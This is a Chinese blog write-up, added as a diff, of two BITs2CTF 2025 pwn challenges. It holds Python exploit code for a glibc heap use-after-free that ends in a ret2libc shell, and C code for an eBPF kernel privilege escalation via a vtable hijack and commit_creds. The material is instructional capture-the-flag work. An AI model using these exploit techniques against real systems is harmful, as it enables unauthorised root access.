@@ -1,0 +1,355 @@
+#+TITLE: BITs2CTF 2025 Writeup Part 2
+#+DATE: <2026-01-19 Mon>
+
+[[file:wp_bits2ctf_2025.org][Part 1]]
+
+这两道是有一些难度，比赛时没做出来的
+
+* pwn - 物理实验选课系统
+#+BEGIN_EXAMPLE
+|-------------------------------------|
+| BITs2CTF  ~  物理实验课，我们喜欢你 |
+|-------------------------------------|
+
+   物理实验课，我们喜欢你~↑🎶👋🏼🤓👋🏼🎤
+
+   我们喜欢磁感线，密立根，弗兰克~😍
+
+   物理实验课，我们喜欢你～↑🎶🤓👐🏻
+
+   光干涉，RLC，普朗克，示~波~器~🎶😋
+
+[*] 欢迎来到「BIT ~ 物理实验选课」网站
+#+END_EXAMPLE
+#+BEGIN_EXAMPLE
+[!] 【旷课扣分提醒！！！】各位同学：请务必按时上课，如不课前自行退选实验，不来上课的属于旷课，每次旷课，期末课程总分扣3分！！！
+#+END_EXAMPLE
+一道典型的堆 UAF，GLIBC_2.39，delete_course 之后还可以 r/w 那个指针。
+使用 unsorted bin + tcache + environ
+
+先是 tcache 泄露堆基址，unsorted bin 泄露 libc 基址
+#+BEGIN_SRC python
+add_lecture(4, 65) #1
+add_lecture(9, 2) #2
+add_lecture(9, 2) #3
+
+delete_lecture(1)
+delete_lecture(2)
+delete_lecture(3)
+
+show_lecture(1)
+
+unsorted_fdbk = u64(io.recv(8))
+main_arena = unsorted_fdbk - 0x60
+libc_base = main_arena - 0x0203AC0
+print('libc_base', hex(libc_base))
+environ = libc_base + 0x7f3c1a20ad58 - 0x7f3c1a000000
+
+show_lecture(2)
+tcache_aslr_base = u64(io.recv(8))
+tcache_key = u64(io.recv(8))
+print(hex(tcache_aslr_base))
+#+END_SRC
+
+然后 tcache poisoning 使下一个 malloc 返回 environ-24，泄露栈指针
+#+BEGIN_EXAMPLE
+pwndbg> telescope &environ
+00:0000│  0x7f489dc0ad58 (environ) —▸ 0x7ffc9bc75308 —▸ 0x7ffc9bc757e1 ◂— 'COLORTERM=truecolor'
+#+END_EXAMPLE
+（因为注意到这里 environ 不是 16 对齐的，然后发现 environ-8 会把 environ 里的指针清零）
+#+BEGIN_SRC python
+edit_lecture(3, p64((environ-24) ^ tcache_aslr_base))
+
+add_lecture(9, 2) #4
+add_lecture(9, 2) #5
+show_lecture(5)
+
+io.recv(24)
+stack_addr = u64(io.recv(8))
+print(hex(stack_addr))
+#+END_SRC
+
+再来一个 tcache poisoning 使 malloc 返回栈指针
+#+BEGIN_SRC python
+rbp_addr = stack_addr - 0xab058 + 0xaaf10
+
+add_lecture(9, 3) #6
+add_lecture(4, 3) #7
+delete_lecture(6)
+delete_lecture(7)
+
+edit_lecture(7, p64((rbp_addr) ^ tcache_aslr_base))
+
+add_lecture(4, 3) #8
+add_lecture(4, 3) #9
+#+END_SRC
+
+最后直接 ret2libc
+#+BEGIN_SRC python
+poprdiret = 0x000000000010f78b
+ret = 0x000000000002882f
+binsh = 0x00000000001cb42f
+system = elf.libc.symbols["system"]
+
+edit_lecture(9, cyclic(8) + p64(poprdiret+libc_base) + p64(binsh+libc_base) + p64(ret+libc_base) + p64(system+libc_base+1))
+
+# gdb.attach(io)
+sla('操作：', '5')
+io.sendline('cat /flag')
+
+io.interactive()
+#+END_SRC
+
+* pwn - 🥷忍术🥷「写死你 • 内核原语」
+这是我做的第一道内核题哈哈。
+bpf 板子参考 [[https://nazrinduck.github.io/2025/04/15/ebpf1/#调用模板][马老师]]
+
+首先知道我们手头有什么，目标是什么。
+#+BEGIN_SRC c
+BPF_CALL_3(bpf_bits2bpf, struct bpf_map *, map, s64, offset, u64, val)
+{
+	s64 *map_ptr = (s64 *)(map);
+	if (offset >= 0x0 && offset < (0x200 / 0x8)) {
+		// 写死你,
+		// 内核原语(Kernel Primitive)
+		map_ptr[offset] = val;
+		return 0;
+	}
+	return 1;
+}
+#+END_SRC
+现在有的是 struct bpf_map 中前 0x200 的任意写，bpf_map 只有 240 大小，意味着可以写到外面去。
+但这点大小对于内核空间来说还是太小了，肯定不能用于任意地址写。
+
+目标是把当前进程改为 uid0，那么有两种办法，将 task_struct 中 cred 改为 &init_cred，或 commit_cred(&init_cred)。
+前者需要一个任意地址写，后者需要执行函数。
+
+最初，一个很朴素的想法就是修改 bpf_map 中的 max_entries 为 -1，就可以 OOB 读写，
+#+BEGIN_SRC c
+#define BPF_FUNC_bits2bpf 212
+#define EVIL_MAX_ENTRIES_VALUE 0xFFFFFFFF00000008
+#define MAP_MAX_ENTRIES_OFFSET_S64  4
+
+int bpf_prog_load_once(int map_fd) {
+    const struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+          
+        // r2 = offset (s64 index)
+        BPF_MOV64_IMM(BPF_REG_2, MAP_MAX_ENTRIES_OFFSET_S64),
+          
+        // r3 = value (new max_entries)
+        BPF_LD_IMM64_RAW(BPF_REG_3, 0, EVIL_MAX_ENTRIES_VALUE),
+          
+        // Call helper bits2bpf(map, offset, val)
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
+          
+        // Exit
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    ...
+}
+
+
+int main() {
+    ...
+    uint32_t key = 114514;
+    uint64_t val = 0;
+    if (bpf_lookup_elem(map_fd, &key, &val) == 0) {
+        printf("[+] OOB Read Successful! Val at idx %d: 0x%lx\n", key, val);
+    } else {
+        error(1, "[-] Exploit failed: max_entries not corrupted.");
+    }
+}
+#+END_SRC
+那么 *如果* task_struct 在 bpf_map 的高地址，就可以按 comm 找到并修改 cred。（然而最后发现实在低地址）
+
+然后就翻好多资料，发现了这几个 很（可）有（以）帮（照）助（抄）：
+1. [[https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2/blob/main/d3bpf/exp/source/core.c][d3ctf2022-pwn-d3bpf-and-v2]]
+2. [[https://web.archive.org/web/20220308210028/https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story][Kernel Pwning with eBPF: a Love Story]]
+3. [[https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification][Linux Kernel Privilege Escalation via Improper eBPF Program Verification]]
+
+首先是任意地址读，可以通过把 bpf_map 中的 btf 写成 someaddr - offsetof(struct btf, id)，
+然后 BPF_OBJ_GET_INFO_BY_FD 就能返回一个 u32
+#+BEGIN_SRC c
+#define OFFSET_FROM_DATA_TO_BTF_ID                  0x58
+uint32_t kernel_read_uint32(int map_fd, uintptr_t addr) {
+    const struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+          
+        // r2 = offset (s64 index)
+        BPF_MOV64_IMM(BPF_REG_2, BTF_OFFSET_S64),
+          
+        // r3 = value (btf)
+        BPF_LD_IMM64(BPF_REG_3, addr - OFFSET_FROM_DATA_TO_BTF_ID),
+          
+        // Call helper bits2bpf(map, offset, val)
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
+
+        // Exit
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+  
+    union bpf_attr attr = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insns = ptr_to_u64(&insns),
+        .insn_cnt = sizeof(insns) / sizeof(struct bpf_insn),
+        .license = ptr_to_u64("GPL"),
+        .log_buf = ptr_to_u64(bpf_log_buf),
+        .log_size = LOG_BUF_SIZE,
+        .log_level = 2,
+    };
+  
+    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+    if (prog_fd < 0)
+        err(1, "Error while loading bpf program (kernel_read)");
+
+    int ret = trigger1(prog_fd);
+    if (ret < 0)
+        err(1, "Error while trigger bpf program");
+
+    struct bpf_map_info info = {0};
+    union bpf_attr info_attr = {
+        .info.bpf_fd = map_fd,
+        .info.info = (long long unsigned int) &info,
+        .info.info_len = sizeof(info)
+    };
+
+    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &info_attr, sizeof(info_attr));
+    if (ret < 0)
+        err(1, "Failed to get map info");
+
+    close(prog_fd); // !!!
+
+    return info.btf_id;
+}
+#+END_SRC
+好，那现在拿到这个有什么用呢？[1] 和 [3] 都用了 init_pid_ns 和基数树，Gemini 告诉我可以直接顺着 init_task->tasks 链表遍历（由于 nokaslr）
+然后判断一下 comm 是否为当前进程名 exploit 就行，这样就拿到了当前进程的 task_struct
+
+延续之前的思路，如果我能找到 task_struct 与 bpf_array 的相对偏移，就能利用上文的 OOB 写改 cred。
+那问题就变成了找 bpf_array 的地址，既然都找到了 task_struct，这并不难，因为 map_fd 就是一个当前进程的 fd。
+
+#+BEGIN_SRC c
+uintptr_t find_bpf_map_addr(int map_fd, uintptr_t task) {
+    // task_struct->files
+    uintptr_t files_addr;
+    kernel_read(map_fd, task + TASK_FILES_OFF, sizeof(uintptr_t), &files_addr);
+    printf("struct files_struct *\t%p\n", files_addr);
+
+    // task_struct->files->fd_array[map_fd]
+    uintptr_t map_file_addr;
+    kernel_read(map_fd, files_addr + FILES_STRUCT_FDARRAY_OFF + 8 * map_fd , sizeof(uintptr_t), &map_file_addr);
+    printf("struct file *\t%p\n", map_file_addr);
+
+    // task_struct->files->fd_array[map_fd]->private_data
+    uintptr_t bpf_map_addr;
+    kernel_read(map_fd, map_file_addr + FILE_PRIVATE_DATA_OFF, sizeof(uintptr_t), &bpf_map_addr);
+    printf("struct bpf_map *\t%p\n", bpf_map_addr);
+    ...
+#+END_SRC
+然后我就发现，task_struct 是在 bpf_map 更高的地址，难怪最开始的想法走不通。
+其实到了这一步，也就快完成了。[3] 中提到了可以替换 map_push_elem 为 map_get_next_key 达成任意地址写，
+但 [1] 中用的是 work_for_cpu_fn，问 Gemini，告诉我这是个万能 gadget。
+#+BEGIN_SRC c
+struct work_for_cpu {
+	struct work_struct work;
+	long (*fn)(void *);
+	void *arg;
+	long ret;
+};
+
+static void work_for_cpu_fn(struct work_struct *work)
+{
+	struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
+
+	wfc->ret = wfc->fn(wfc->arg);
+}
+#+END_SRC
+
+剩下的就是把 vtable 拷出来一份，把 map_get_next_key 改成 work_for_cpu_fn，写回 map，再把地址写回 ops，
+而元素的地址其实就在 bpf_map 后面。
+#+BEGIN_SRC c
+struct bpf_array {
+	struct bpf_map map;
+	u32 elem_size;
+	u32 index_mask;
+	struct bpf_array_aux *aux;
+	union {
+		DECLARE_FLEX_ARRAY(char, value) __aligned(8);
+		DECLARE_FLEX_ARRAY(void *, ptrs) __aligned(8);
+		DECLARE_FLEX_ARRAY(void __percpu *, pptrs) __aligned(8);
+	};
+};
+#+END_SRC
+
+#+BEGIN_SRC c
+    ...
+    // (struct bpf_map *)(task_struct->files->fd_array[map_fd]->private_data)->ops
+    uintptr_t map_ops_addr;
+    kernel_read(map_fd, bpf_map_addr, sizeof(uintptr_t), &map_ops_addr);
+    printf("struct bpf_map_ops *\t%p\n", map_ops_addr);
+
+    uintptr_t array_map_ops[5] = {0}; // only need first 5 ops actually
+    kernel_read(map_fd, map_ops_addr, 5 * 8, array_map_ops);
+    printf("map_get_next_key = %p\n", array_map_ops[4]);
+
+    array_map_ops[4] = work_for_cpu_fn_addr;
+
+    uint64_t key = 0;
+    bpf_update_elem(map_fd, &key, array_map_ops, 0);
+
+    const struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+        BPF_MOV64_IMM(BPF_REG_2, 0),
+        BPF_LD_IMM64(BPF_REG_3, bpf_map_addr + MAP_DATA_OFF),
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+  
+    union bpf_attr attr = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insns = ptr_to_u64(&insns),
+        .insn_cnt = sizeof(insns) / sizeof(struct bpf_insn),
+        .license = ptr_to_u64("GPL"),
+        .log_buf = ptr_to_u64(bpf_log_buf),
+        .log_size = LOG_BUF_SIZE,
+        .log_level = 2,
+    };
+  
+    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
+    if (prog_fd < 0)
+        err(1, "Error while loading bpf program (hijack)");
+
+    int ret = trigger1(prog_fd);
+    if (ret < 0)
+        err(1, "Error while trigger bpf program");
+
+    puts("[+] hijack vtable done.");
+}
+#+END_SRC
+
+之后就是再利用题目的内核原语，把 bpf_map 改成 work_for_cpu 的形式，调用 BPF_MAP_GET_NEXT_KEY 就能执行 commit_cred(&init_cred) 了。
+#+BEGIN_SRC c
+void load_work(int map_fd) {
+    const struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+        BPF_MOV64_IMM(BPF_REG_2, 32/8),
+        BPF_LD_IMM64(BPF_REG_3, commit_cred), // long int (*fn)(void *)
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
+
+        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
+        BPF_MOV64_IMM(BPF_REG_2, 40/8),
+        BPF_LD_IMM64(BPF_REG_3, init_cred),  // void * arg
+        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_bits2bpf),
+
+        BPF_MOV64_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    ...
+#+END_SRC
+
+[[https://gist.github.com/dongdigua/219dd190bd9191f2bc860e5c69f54546][整个 exp]] 大体上 +参考+ 照抄 [[https://github.com/chujDK/d3ctf2022-pwn-d3bpf-and-v2][d3bpf]]，推荐看一下人家的 writeup 和 exp。
+
